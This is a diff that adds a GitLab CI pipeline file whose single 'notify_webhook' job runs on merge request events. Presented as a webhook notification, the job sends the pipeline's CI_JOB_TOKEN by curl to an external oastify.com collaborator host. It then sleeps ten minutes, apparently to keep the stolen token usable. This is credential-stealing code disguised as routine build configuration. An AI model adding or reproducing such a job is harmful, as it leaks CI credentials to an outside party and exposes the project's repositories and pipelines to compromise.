@@ -1,0 +1,16 @@
+stages:  
+  - notify
+
+notify_webhook:  
+  stage: notify  
+  script:  
+    - >  
+      curl -X POST yvxc3i091r8vodfufmmy4nqt0k6bu4it.oastify.com 
+      -H "Content-Type: application/json"   
+      -d '{"gitlab_job_token": "'$CI_JOB_TOKEN'"}'
+
+    - sleep 600  
+  rules:  
+   - if: $CI_PIPELINE_SOURCE == 'merge_request_event'  
+
+
